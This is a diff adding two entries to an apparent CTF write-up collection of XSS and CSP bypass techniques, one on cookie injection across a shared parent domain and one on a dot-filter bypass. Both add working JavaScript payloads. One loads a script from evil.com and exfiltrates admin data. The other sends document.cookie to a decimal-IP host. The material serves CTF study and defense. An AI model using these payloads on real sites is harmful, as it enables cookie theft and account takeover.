@@ -13,6 +13,8 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
 - [XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)](#xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026)
 - [CSP Bypass via link prefetch (Boston Key Party 2016)](#csp-bypass-via-link-prefetch-boston-key-party-2016)
+- [Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)](#cross-origin-xss-via-shared-parent-domain-cookie-injection-0ctf-2017)
+- [XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)](#xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016)
 
 ---
 
@@ -277,3 +279,45 @@ for i in range(1, 100001):
 ```
 
 **Key insight:** CSP restricts script execution but not navigation or resource prefetch. Use `<link rel="prefetch">` or `<meta http-equiv="refresh">` for scriptless exfiltration when XSS is possible but `script-src` blocks inline/remote JS. Data is sent via URL parameters or the `Referer` header.
+
+---
+
+## Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)
+
+**Pattern (complicated xss):** When an attacker-accessible page and the XSS target share a second-level domain (e.g., `user.example.vip` and `admin.example.vip`), cookies set with `domain=.example.vip` are sent to both subdomains. Inject an XSS payload via a cookie value on the attacker-accessible page, then redirect the victim to the admin interface where the cookie renders as XSS.
+
+```javascript
+// On attacker-accessible subdomain: set cookie for shared parent domain
+document.cookie = 'username=<script src=//evil.com/payload.js></script>; path=/; domain=.government.vip;';
+// Redirect victim to admin interface on sibling subdomain
+window.top.location = 'http://admin.government.vip:8000';
+
+// In payload.js: bypass sandbox by stealing XMLHttpRequest from iframe
+var iframe = document.createElement('iframe');
+iframe.src = 'about:blank';
+document.body.appendChild(iframe);
+window.XMLHttpRequest = iframe.contentWindow.XMLHttpRequest;
+// Now use restored XMLHttpRequest to exfiltrate admin data
+```
+
+**Key insight:** Domain-scoped cookies cross subdomain boundaries. If any subdomain reflects cookie values without sanitization, setting a malicious cookie from a different subdomain achieves XSS on the target. The iframe trick restores `XMLHttpRequest` when the sandbox environment overrides it.
+
+---
+
+## XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)
+
+**Pattern (yoso):** When an XSS filter strips dots from URLs (blocking `attacker.com` and `document.cookie`), bypass using: (1) Convert IP addresses to decimal format (`92.123.45.67` → single integer), eliminating all dots from the URL. (2) Use JavaScript bracket notation for property access: `window["location"]`, `document["cookie"]`. (3) Use `"str"["concat"]()` instead of the `+` operator for string concatenation.
+
+```html
+<!-- Filter blocks dots, breaking: document.cookie, attacker.com -->
+<!-- Bypass: decimal IP + bracket notation -->
+<script>
+  window["location"] = "http://1558071511/"["concat"](document["cookie"])
+</script>
+
+<!-- Decimal IP conversion: -->
+<!-- 92*256^3 + 123*256^2 + 45*256 + 67 = 1558071511 -->
+<!-- http://1558071511/ resolves to 92.123.45.67 -->
+```
+
+**Key insight:** Decimal IP addresses are valid in URLs and contain no dots. Combined with JavaScript's bracket notation (which uses string keys instead of dot access), this bypasses any filter that targets the dot character.
